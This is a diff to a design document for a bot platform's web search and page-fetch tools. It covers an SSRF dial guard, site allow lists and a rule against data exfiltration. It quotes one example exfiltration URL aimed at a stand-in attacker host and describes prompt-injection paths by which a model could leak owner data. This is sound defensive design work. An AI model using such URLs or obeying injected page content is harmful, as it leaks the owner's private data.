@@ -206,32 +206,48 @@ Each answers the model with a fixed one-line error (no upstream text) and logs a
 
 ## Web access (phase 2)
 
-The gateway offers two tools, `search` and `fetch`, as an MCP server named `web` (OMP shows them as `mcp__web_search` and `mcp__web_fetch`). The search vendor makes the outside calls: search is
-Tavily Search and reading a page is Tavily Extract, so the gateway dials only the vendor's API host. A page's own
-server never sees our addresses, and the gateway never opens a connection to an address a page or the model named. The
-sandbox has no raw network and gets no new route beyond `/v1/mcp`.
+The gateway offers two tools, `search` and `fetch`, as an MCP server named `web` (OMP shows them as `mcp__web_search` and `mcp__web_fetch`). **As built (Sam chose "our gateway fetches pages", option 1):** a search is
+Tavily Search and gets the query and fixed flags only. A page is read by our own key-less `bots-fetch` container, which the gateway
+asks for one checked address; it applies the dial guard below on every hop. The gateway itself dials only the vendor's API host
+and `bots-fetch`, never an address a page or the model named. A page's own server sees the bots server's address and a fixed
+`User-Agent`, never the owner. The sandbox has no raw network and gets no new route beyond `/v1/mcp`.
 
 **Provider.** Tavily, which the backend already pays for. Checked in the code: the backend reads `TAVILY_API_KEY` from
 its environment (`docker-compose.phala.yml`, `backend/src/mcp-meetings/config.ts`) and calls only
 `POST https://api.tavily.com/search` with the key in the JSON body, `max_results: 5`, `include_answer: true` and
-`search_depth: "basic"` (`backend/src/mcp-meetings/web-search.ts`). So this plan adds no provider and no account. Two
-things are not what the backend does today, and are not assumed: (1) it never calls Extract, so whether the plan
-covers `/extract`, and at what price, is unchecked; (2) bots run in their own compose project, so "the existing key"
+`search_depth: "basic"` (`backend/src/mcp-meetings/web-search.ts`). So this plan adds no provider and no account. As built the provider is used for Search only (Extract is not
+called, so its plan coverage no longer matters). One thing is not what the backend does today and is not assumed: bots run in their own compose project, so "the existing key"
 means the same secret held a second time in the bots gateway's environment, and chat web search and Main would draw on
 one provider budget. A separate key under the same account, if Tavily offers one, keeps budgets and rotation apart;
 that is the only open choice (decision 4). Brave, Exa, Kagi or a self-hosted SearXNG are alternatives, not proposals.
-Search queries and page URLs go to the vendor, and the owner copy says so.
+Only the search query goes to the vendor (no site list, no page address, no page text, no user data); the owner copy says so.
 
 **Checks before a call.**
 - `web__fetch` takes one URL: scheme `https` or `http` only; no user info; ports 80 and 443 only; no IP literal and no
-  single-label or `localhost` name; at most 2,048 characters. The vendor does the connecting, so SSRF into our network
-  is closed by construction; these checks keep nonsense from reaching it.
+  single-label or `localhost` name; at most 2,048 characters. These checks keep nonsense out; they do not resolve names.
+  SSRF into our network is closed by the dial guard in `bots-fetch` (below), which resolves every name and refuses any
+  non-public answer.
 - While the conversation is marked as holding owner data, the URL must have come from a search result in this
   conversation or from the owner (the exfil rule, below).
-- Time: 20 s per call. Size: the returned text is cut at 40,000 characters; anything but plain text from the vendor is
-  dropped. The result is wrapped as untrusted content (below).
-- Fetching through a vendor does not stop exfiltration: `https://attacker.example/?d=<data>` through Extract still
-  delivers the data to the attacker. Only the exfil rule does that.
+- Time: 20 s per read (the reader's own deadline; the gateway allows 25 s). Size: 1 MiB of body (cut, not held), the text
+  cut at 40,000 characters for the model; text types only (HTML, XHTML, plain text); PDFs and pages that need JavaScript
+  are not read, and the model is told so in one sentence. The result is wrapped as untrusted content (below).
+- Fetching does not stop exfiltration: `https://attacker.example/?d=<data>` still delivers the data to the attacker. Only the
+  known-address rule and the exfil rule do that.
+
+**As built: the page reader (`bots/src/fetch-guard.ts`, `fetch-service.ts`, `fetch-main.ts`, `page-text.ts`).** One extra container
+in the bots compose, same image, unprivileged, read-only, no capabilities, no key, no volume. It is on `fetch-link` (an
+internal network shared only with the gateway) and `fetch-out` (its own way to the internet); it shares no network with the
+supervisor, the sandboxes' sockets or the ingress. `POST /fetch {url, hosts}` (`hosts`: the owner's list, or null for any
+public site). The guard resolves the name itself and refuses it if any answer is not a public address (private, loopback,
+link-local and the cloud-metadata address, CGNAT, multicast, reserved, and the IPv6 forms that embed IPv4: mapped, NAT64,
+6to4, Teredo); connects to a checked address, never the name again (so a rebinding resolver gains nothing); verifies TLS
+against the name; re-checks every redirect (3 at most) and the owner's list; sends no cookie, referer or credential; and
+bounds headers, body, time and concurrency. HTML becomes plain text there: scripts and styles go, an image becomes its
+alt text, a link becomes `text (address)` so a page-offered address can be read next. The gateway re-checks the address
+the reader ended on against the list, strips anything that could draw, cuts and wraps. Tests: every blocked range, a name
+with one internal answer, a redirect into a blocked range or off the list, a changed second answer, an oversize body, a
+silent and a trickling server, a malformed response.
 
 **Dial guard** (phase 3, and any direct fetch added later). Every request the gateway makes to a host the owner or a page named, and every redirect hop, goes through one guard. It is its own module with its own tests, built before phase 3:
 - Scheme `https` or `http` only; no user info in the URL; ports 80 and 443 only; no non-HTTP schemes of any kind.
@@ -267,7 +283,8 @@ presets, the same shape as the large assistants' domain controls (Claude's allow
 allow list):
 - **Off** (default). Every call is refused at the gateway and counted as blocked.
 - **Only sites I list.** Up to 50 site names, subdomains included. The gateway refuses any other site even if the bot asks
-  for it directly, and a search is sent to the provider with the same list, its results filtered again.
+  for it directly. A search is not sent the list: the provider gets the query only, and the results are filtered to the
+  list here. A page is read by `bots-fetch`, which is given the list and applies it to every redirect.
 - **Any public site.** Search the web and read any public page, with a stronger warning.
 
 Turning on either preset shows the prompt-injection warning first, and so does moving from the list to any site. The
@@ -279,8 +296,8 @@ earlier search or page. The conversation mark (decision 5) is separate and not p
 tools yet. Residual risk, stated to the owner: a search query (at most 200 characters), a choice among the addresses a page offered
 (about 285 bytes a day per bot at the caps), a link the owner is asked to paste or open, and what Main keeps in its own
 state can carry data out; and anyone who can post on a listed site can still try an injection. The owner's list refuses
-shared places (`github.io`, `pages.dev`, `co.uk`, ...) because listing one covers every tenant. The provider is sent exactly
-the checked address without its fragment, and a page is delivered only if the result is for that address. This is why the
+shared places (`github.io`, `pages.dev`, `co.uk`, ...) because listing one covers every tenant. The page reader is sent exactly
+the checked address without its fragment, and the address it reports ending on is checked again against the list. This is why the
 list preset is the safer one.
 
 **Note.** The conversation mark in the exfil rule below still applies to the web and MCP tool rules; only the image prompt no longer depends on it.
@@ -584,7 +601,8 @@ argument conditions, and filters `tools/list` responses, including per SSE event
   SSRF-safe dialing of arbitrary owner hosts. Not run or verified by us.
 - **Fetch through the search vendor** (Tavily Extract, Exa contents): the CVM dials only the vendor's fixed host, so
   SSRF and abuse from our addresses are closed by construction. It costs a per-page fee, the vendor sees the URLs, and it
-  does nothing for the exfil rule.
+  does nothing for the exfil rule. Not what was built: the owner chose that our own gateway fetches pages, so the vendor
+  sees search queries only.
 - **Hosted sandbox providers and MCP gateway products** move the whole sandbox off our CVM or aim at local containers
   and corporate sign-in; neither fits a sandbox that must stay inside the attested CVM.
 - Not surveyed: Fly Machines and Envoy's dynamic forward proxy (alternatives to Smokescreen).
@@ -662,10 +680,9 @@ is evaluated too, the rest apply to either):
    service identity, credential, tenant namespace and grant ceiling (section 2). None of that exists today.
 1. **TinyCloud MCP.** Builds the shared parts the others reuse: the `/v1/mcp` route and JSON-RPC rebuild, the grant
    hand-off through the backend, the budget ledger, the count-only audit, the settings surface and the owner events.
-2. **Web.** Adds the vendor adapter (Tavily Search and Extract), the web tools, the URL checks and the exfil rule with
+2. **Web.** Adds the vendor adapter (Tavily Search) and the key-less page reader, the web tools, the URL checks and the exfil rule with
    its conversation mark. They ship together: this phase is what completes private data, untrusted content and a way
-   out. The reply-rendering rule ships no later than this phase. Waits on the provider decision (key, Extract
-   coverage).
+   out. The reply-rendering rule ships no later than this phase. Waits on the provider decision (key).
 3. **Owner-added servers.** Adds the server registry, discovery, the credential flows with their bindings, tool pinning,
    the settings list, the dial guard (its own module with its own tests) and the Smokescreen hop. The egress spike runs
    before it starts.
@@ -710,8 +727,7 @@ flag and does not change the others.
 4. **Search provider.** Recommended default: Tavily, which TinyChat already pays for, so there is no new provider.
    Checked in the code: the backend reads `TAVILY_API_KEY` from its environment and calls `POST
    https://api.tavily.com/search` (`backend/src/mcp-meetings/web-search.ts`). Not confirmed from code: the plan and
-   contract behind that key (no DPA found in the compliance notes), and whether it covers Extract, which the backend
-   does not call today (unchecked). **The key is a credential decision:** the bots service holding the backend's
+   contract behind that key (no DPA found in the compliance notes), (Extract is no longer used). **The key is a credential decision:** the bots service holding the backend's
    `TAVILY_API_KEY` is a second holder of the same secret in another deployment. Options: a separate key under the same
    account (recommended: separate budget and rotation), or share the backend's key. The owner decides; nothing is added
    until then. Alternatives: Brave Search API, Exa, Kagi, self-hosted SearXNG.
